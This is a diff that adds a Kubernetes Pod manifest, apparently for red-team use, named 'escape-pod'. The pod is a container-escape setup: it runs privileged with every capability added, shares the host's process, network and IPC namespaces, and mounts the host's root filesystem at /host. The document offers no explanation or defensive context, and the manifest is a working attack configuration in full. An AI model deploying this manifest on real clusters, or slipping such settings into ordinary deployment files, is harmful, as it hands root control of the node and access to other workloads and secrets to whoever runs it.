@@ -1,0 +1,27 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-pod
+  namespace: default
+  labels:
+    app: red-team-escape
+spec:
+  hostPID: true
+  hostNetwork: true
+  hostIPC: true
+  containers:
+  - name: escape-container
+    image: ubuntu:22.04
+    command: ["sleep", "infinity"]
+    securityContext:
+      privileged: true
+      allowPrivilegeEscalation: true
+      capabilities:
+        add: ["ALL"]
+    volumeMounts:
+    - mountPath: /host
+      name: host-root
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
